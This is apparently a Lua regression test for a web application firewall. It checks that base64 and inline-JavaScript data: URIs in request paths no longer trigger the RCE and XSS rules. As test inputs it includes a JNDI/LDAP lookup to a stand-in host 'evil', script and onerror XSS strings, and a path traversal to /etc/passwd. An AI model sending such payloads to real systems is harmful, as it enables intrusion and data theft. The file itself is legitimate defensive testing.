-- Regression: a `data:` URI embedded in the request PATH is a client-side
-- artifact (a browser / link-preview crawler resolved an inline data: URI as a
-- relative link), so its payload — base64 image bytes or inline JS — reaches the
-- origin as a path. It is inert there (404s, never executed/reflected) but its
-- content used to false-positive the content-injection rules:
--   * RCE (320, BLOCK): epiplosou.gr — a legit Greek Vodafone user's
--     /product/.../data:image/jpg;base64,<blob> where the base64 coincidentally
--     contained "eval"/"exec"/"system" (all valid base64 chars).
--   * XSS (302): mobian.eu — facebookexternalhit fetching an inline
--     /data:text/javascript,<code> whose `s.onload =` tripped the on…= heuristic.
-- strip_data_uri feeds the content rules the path BEFORE the data: scheme; the
-- STRUCTURAL rules (traversal/long-path) keep the raw uri, so a data:-prefixed
-- ../ is still caught, and a data: URI in a query ARG (a real open-redirect/XSS
-- vector) stays fully scanned.

_G.ngx = { now = function() return 1000 end, decode_base64 = function(_) return nil end,
           log = function(_, _) end, ERR = 0, WARN = 1, INFO = 2 }

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

local function get(uri, args)
  return { uri = uri, args = args or "", method = "get", headers = {}, body = "", cookie = "" }
end
local function fires(c, label, want)
  local hit, reason = waf.check(c)
  check(hit == true, label .. " — must fire (got " .. tostring(hit) .. ")")
  check(reason == want, label .. " — reason=" .. want .. " (got " .. tostring(reason) .. ")")
end
local function clean(c, label)
  local hit = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got hit=" .. tostring(hit) .. ")")
end

set_only({ rule_rce = "block", rule_xss = "challenge", rule_traversal = "challenge" })

-- ── FP class: data: URI payload in the PATH must not trip content rules ───────
clean(get("/product/rustic-plus/data:image/jpg;base64,SGVsbGV2YWxsb29leGVjc3lzdGVtQUFB"),
      "RCE FP: base64 image data: URI whose blob contains eval/exec/system")
clean(get("/data:text/javascript,%2F%2F%20x%0As.onload%20%3D%20function%28%29%7B%7D"),
      "XSS FP: data:text/javascript path with s.onload=")
clean(get("/hero/data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmV2YWw8L3NjcmlwdD48L3N2Zz4="),
      "RCE FP: base64 SVG data: URI (type-independent gate)")
clean(get("/x/data:font/woff2;base64,d09GMgAeval00exec00systemABAAAAAAg8"),
      "RCE FP: base64 woff2 font data: URI")

-- ── Security preserved: real attacks and structural rules still fire ──────────
fires(get("/${jndi:ldap://evil/a}"), "real RCE jndi in a normal path still blocks", "WAF_RCE")
fires(get("/search/%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
      "real XSS <script> in a normal path still fires", "WAF_XSS")
fires(get("/p", "q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"),
      "real XSS onerror= in a query arg still fires", "WAF_XSS")
-- The critical no-bypass case: prefixing a data: URI must not smuggle traversal.
fires(get("/data:image/png,/../../../../etc/passwd"),
      "data:-prefixed traversal still caught (structural rules keep raw uri)", "WAF_TRAVERSAL")
-- A data: URI in a query ARG is a real open-redirect/XSS vector — keep scanning it.
fires(get("/go", "next=data:text/html,%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
      "data: URI in a query ARG stays fully scanned", "WAF_XSS")

-- ── No over-strip: a path that merely contains 'data:' (no mediatype+comma) ───
clean(get("/api/metadata:v2/list"),
      "coincidental 'data:' in a normal path is not a data URI (no FP, no strip harm)")

if fails > 0 then
  io.stderr:write(("cfm_waf data: URI scan tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf data: URI path carve-out (rules 302/320 FP, no traversal bypass)")
